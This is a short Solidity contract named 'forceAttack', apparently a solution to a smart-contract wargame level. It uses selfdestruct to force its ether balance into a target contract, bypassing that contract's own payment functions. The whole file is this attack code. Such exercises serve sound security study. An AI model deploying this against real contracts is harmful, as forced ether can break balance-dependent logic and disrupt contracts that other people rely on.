// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract forceAttack {
    constructor () public payable {

    }

    function attack(address payable _constructor) public {
        selfdestruct(_constructor);
    }
}